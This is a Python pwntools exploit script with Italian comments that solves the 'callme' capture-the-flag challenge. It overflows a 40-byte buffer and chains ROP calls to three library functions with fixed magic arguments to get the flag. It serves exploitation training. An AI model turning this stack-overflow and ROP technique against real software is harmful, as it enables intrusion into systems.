import sys
from pwn import *

context(os='linux',arch='amd64')
p = process('./callme')

# con pattern create e search ho trovato che l'offset e' 40
buf = b'\x55'*40

# questa classe mi permette di manipolare il file ELF (il binario)
reference_to_binary_file = ELF('./callme')

#questo mi permette di creare la rop chain
rop_chain = ROP(reference_to_binary_file)


#ho trovato con ghidra queste funzioni che chiamate dentro usefulFunction
#analizzando sempre con ghidra il file libcallme.so ho visto che queste funzioni se chiamate in ordine mi ritornano la flag
# quindi mi prendo le funzioni da chiamare
callme_one_func = reference_to_binary_file.symbols['callme_one']
callme_two_func = reference_to_binary_file.symbols['callme_two']
callme_three_func = reference_to_binary_file.symbols['callme_three']


#per chiamarle perÃ² ho bisogno di canaries ( quelle a destra sono prese dalla challenge, mentre quelle con il - sono prese direttamente da ghidra, FUNZIONANO ENTRAMBI)
canary_1 = -0x2152411021524111 #0xdeadbeefdeadbeef
canary_2 = -0x3501454135014542 #0xcafebabecafebabe
canary_3 = -0x2ff20ff22ff20ff3 #0xd00df00dd00df00d

rop_chain.call([callme_one_func], [canary_1, canary_2, canary_3])
rop_chain.call([callme_two_func], [canary_1, canary_2, canary_3])
rop_chain.call([callme_three_func], [canary_1, canary_2, canary_3])

p.readuntil(b'> ')
#rop_chain.dump()
#print(rop_chain.dump())

p.sendline(buf + rop_chain.chain())
p.interactive()

